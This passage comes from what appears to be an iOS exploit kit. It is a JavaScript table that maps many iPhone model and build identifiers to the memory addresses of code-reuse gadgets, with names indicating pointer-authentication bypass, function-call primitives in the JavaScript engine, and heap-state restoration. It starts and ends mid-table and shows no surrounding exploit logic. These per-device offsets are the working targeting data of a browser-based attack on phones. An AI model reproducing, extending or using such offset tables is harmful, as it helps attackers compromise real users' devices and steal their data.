      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26243b98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f039150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone16,2_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d041ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26243b98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f039150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,1_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c921ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d1b98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f039150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,2_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c921ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d1b98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f039150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,3_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c919ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26197398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed692ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f031150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,4_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c919ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26197398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed692ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f031150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,5_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ef02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c915ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2616e198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed652ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02d150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },

   "iPhone11,2_4_6_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23abd402cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c61dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d6698cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef4e2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f007150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone11,8_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c5e1ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d5198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,1_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c625ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e3b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,3_5_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9802cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c625ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e3b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef122ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f003150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,8_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23aaba02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c53dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d8398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ee302ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f007150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,1_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2610de98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,2_3_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26147598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,4_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c800ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26147598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,2_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ab02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26183b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed212ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,3_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ab02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26183b98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed212ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,4_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c844ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2614a598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed1d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,5_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c844ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2614a598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed1d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f01a150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,6_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a91f02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7b8ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26145098cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ec952ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01e150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,7_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9bb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c858ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26186198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed312ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,8_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9bb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c858ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26186198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed312ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,2_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c5398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,3_22G90": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c5398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,4_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618fb98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed752ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,5_22G90": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9ff02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c89dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618fb98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
